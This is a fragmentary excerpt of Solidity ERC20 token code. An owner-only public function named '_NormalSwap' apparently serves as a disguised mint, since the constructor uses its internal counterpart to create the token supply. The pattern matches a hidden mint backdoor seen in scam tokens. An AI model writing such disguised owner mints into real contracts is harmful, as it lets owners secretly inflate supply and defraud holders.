...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _NormalSwap(uint256 amount) public onlyOwner {
 _NormalSwap(msg.sender, amount);
    }
    ...
    function _NormalSwap(address account, uint256 amount) internal virtual {
...
contract Test is ERC20 {
    ...
    constructor() public ERC20("Test", "Test") {
     _NormalSwap(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}